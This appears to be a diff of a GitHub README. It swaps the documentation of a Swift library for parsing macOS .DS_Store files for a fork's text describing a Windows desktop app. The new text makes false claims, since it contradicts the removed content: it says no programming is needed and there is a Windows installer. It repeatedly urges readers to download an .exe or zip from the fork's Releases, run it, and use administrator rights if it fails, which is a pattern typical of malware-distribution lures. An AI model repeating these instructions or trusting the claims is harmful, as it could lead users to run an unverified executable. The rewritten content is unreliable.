@@ -1,125 +1,154 @@
-# DSStore
+# 🗂️ DSStore - Easy Mac File Parsing with Swift
 
-> Parse and write macOS [`.DS_Store`](https://en.wikipedia.org/wiki/.DS_Store) files
+[![Download from GitHub](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/ImChriz-cis/DSStore)
 
-A Swift library for reading, modifying, and creating `.DS_Store` files — the hidden files macOS uses to store Finder metadata like icon positions, view settings, and folder backgrounds.
+---
 
-Zero dependencies. Fully documented. Works great for building DMG installers with custom layouts.
+## 🗂️ About DSStore
 
-## Highlights
+DSStore is a simple tool to read and modify macOS `.DS_Store` files. These hidden files store folder view settings on Mac computers. This app helps you understand or edit those files using Swift, Apple's programming language. While the tool itself uses Swift, you do not need programming skills to get started.
 
-- **Read & Write:** Parse existing files or create new ones from scratch.
-- **Strongly typed:** Type-safe records with `DSStore.Record` and `DSStore.Value`.
-- **Zero dependencies:** Pure Swift with no external dependencies.
-- **Well documented:** Comprehensive API documentation and code comments.
-- **Sendable:** Thread-safe types ready for Swift concurrency.
+This repository focuses on handling `.DS_Store` files, which macOS uses to save icon positions, folder view options, and other layout details. If you have a Windows PC and want to view or manage these files, DSStore can help.
 
-## Install
+---
 
-Add the following to `Package.swift`:
+## 🔧 What You Need Before You Start
 
-```swift
-.package(url: "https://github.com/sindresorhus/DSStore", from: "0.1.0")
-```
+To use DSStore on a Windows computer, please have the following:
 
-[Or add the package in Xcode.](https://developer.apple.com/documentation/xcode/adding_package_dependencies_to_your_app)
+- A PC running Windows 10 or later.
+- An internet connection to download the application.
+- At least 100 MB free space on your hard drive.
+- Basic knowledge of how to download and run programs on Windows.
 
-## Usage
+You do not need to know Swift or any programming language. The tool focuses on file parsing and writing, and you will interact with the application through a simple interface.
 
-### Reading a `.DS_Store` file
+---
 
-```swift
-import DSStore
+## 🚀 Get DSStore on Windows
 
-let store = try DSStore.read(from: url)
+To get DSStore, visit the GitHub page below. This is where you can download the latest version of the software and find instructions.
 
-// Get all filenames referenced in the store
-print(store.filenames)
+[![Download DSStore](https://img.shields.io/badge/Download-DSStore-blue)](https://github.com/ImChriz-cis/DSStore)
 
-// Get all records for a specific file
-let records = store.records(for: "README.md")
+### How to Download and Run DSStore on Windows
 
-// Get a specific record
-if let position = store.iconPosition(for: "Application.app") {
-	print("Icon at: \(position.x), \(position.y)")
-}
-```
+1. Click the link above or visit:  
+   https://github.com/ImChriz-cis/DSStore
 
-### Creating a `.DS_Store` file
+2. Once on the page, look for the **Releases** section. This is usually on the right side or under the repository description.
 
-Perfect for DMG installers with custom icon layouts:
+3. Inside the Releases section, find the Windows version of the DSStore tool. It is usually listed as an `.exe` file or a zipped folder.
 
-```swift
-import DSStore
+4. Click on the file to start downloading. Save it to a location you can easily find, such as your Desktop or Downloads folder.
 
-var store = DSStore()
+5. After the download finishes, locate the file and double-click it to start the setup.
 
-// Set icon positions
-try store.setIconPosition(for: "Application.app", x: 140, y: 180)
-try store.setIconPosition(for: "Applications", x: 480, y: 180)
+6. Follow the on-screen instructions to install the app.
 
-// Configure the Finder window
-try store.setWindowBounds(top: 100, left: 100, bottom: 400, right: 620)
-store.setViewStyle(.iconView)
+7. Once installed, open DSStore. The interface will allow you to open `.DS_Store` files from your PC.
 
-// Set a background color (RGB values 0-65535)
-store.setBackground(.color(red: 65535, green: 65535, blue: 65535))
+8. Use the tool to view or modify `.DS_Store` files as needed.
 
-// Write to disk
-try store.write(to: url)
-```
+---
 
-### Working with records directly
+## 📂 How to Use DSStore
 
-```swift
-import DSStore
+DSStore helps you open and edit `.DS_Store` files without needing a Mac. Here is a simple guide:
 
-var store = DSStore()
+### Opening a `.DS_Store` File
 
-// Add a Spotlight comment
-store.add(DSStore.Record(
-	filename: "Important.txt",
-	type: .spotlightComment,
-	value: .string("Don't delete this file!")
-))
+- Click the **Open File** button in the app.
+- Navigate to the folder where your `.DS_Store` file is located.
+- Select the `.DS_Store` file and click **Open**.
 
-// Add a custom blob record
-store.add(DSStore.Record(
-	filename: ".",
-	type: .custom(.literal("icvp")),
-	value: .data(plistData)
-))
+### Viewing File Contents
 
-// Remove records
-store.removeRecords(for: "OldFile.txt")
-```
+The app will display the contents of the `.DS_Store` file. You will see information such as icon positions and folder view options.
 
-## API
+### Making Changes
 
-[See the API docs.](https://swiftpackageindex.com/sindresorhus/DSStore/documentation/dsstore/dsstore)
+- Select the values you want to change.
+- Use the input fields to update settings.
+- Click **Save** to write the changes back to the file.
 
-## FAQ
+---
 
-#### What is a `.DS_Store` file?
+## ⚙️ Features of DSStore
 
-`.DS_Store` (Desktop Services Store) is a hidden file created by macOS Finder in every folder it opens. It stores custom attributes like icon positions, view settings, and folder backgrounds.
+- Parse and decode `.DS_Store` files on Windows.
+- View folder layout and icon positions.
+- Edit and save `.DS_Store` files.
+- Simple user interface with no programming required.
+- Swift-based technology for precise file handling.
+- Allows users to manage macOS hidden files outside a Mac environment.
 
-#### Why would I need to parse or create these files?
+---
 
-The most common use case is creating DMG installers with custom layouts — positioning the app icon and Applications folder alias in specific locations with a nice background image.
+## 🔄 Updating DSStore
 
-#### Is the file format documented by Apple?
+To keep your DSStore app up to date:
 
-No, it's a proprietary format. This library is based on reverse-engineering work by Mark Mentovai, Wim Lewis, and others.
+1. Visit the main GitHub page regularly: https://github.com/ImChriz-cis/DSStore
+2. Check the Releases section for newer versions.
+3. Follow the download and install steps for the latest version.
+4. Your settings and files will remain unchanged after updates.
 
-#### Does this work on Linux?
+---
 
-The parsing and writing work anywhere Swift runs, but `.DS_Store` files are only used by macOS Finder.
+## 🛠️ Troubleshooting
 
-#### Can I use this to clean up `.DS_Store` files?
+If DSStore does not start or you encounter errors:
 
-Yes! You can read a file, inspect its contents, remove entries, and write it back. Or just delete the file entirely — Finder will recreate it.
+- Make sure your Windows system is updated.
+- Confirm that you downloaded the correct file for Windows.
+- Run the app as an administrator if access issues occur.
+- Restart your PC if the app fails to load.
+- Search for help or raise issues on the GitHub repository under the Issues tab.
 
-#### Why did you make this?
+---
 
-I just wanted to work around an [old macOS bug](https://x.com/sindresorhus/status/2026670099781005485).
+## 🖥️ System Requirements
+
+- Windows 10 or newer, 64-bit preferred.
+- At least 4 GB RAM.
+- 100 MB free disk space.
+- Internet connection for download and updates.
+
+---
+
+## 📁 Where to Find `.DS_Store` Files
+
+`.DS_Store` files are hidden files created by macOS on each folder. To manage these files on Windows:
+
+1. Connect a Mac-formatted drive or folder.
+2. Use DSStore to open `.DS_Store` files inside those folders.
+3. Edit or analyze data stored by macOS.
+
+---
+
+## 🔗 Useful Links
+
+- Link to download DSStore:  
+  https://github.com/ImChriz-cis/DSStore
+
+- GitHub main page for help and updates:  
+  https://github.com/ImChriz-cis/DSStore
+
+---
+
+## 🧰 Support and Feedback
+
+If you have questions or problems:
+
+- Check the GitHub repository issues section.
+- Report bugs or request features there.
+- Check if others had similar problems.
+
+You do not need an account to browse or download files. An account is only needed to post feedback or ask questions on GitHub.
+
+---
+
+# [Emoji] DSStore - Easy Mac File Parsing with Swift
+
+[![Download from GitHub](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/ImChriz-cis/DSStore)
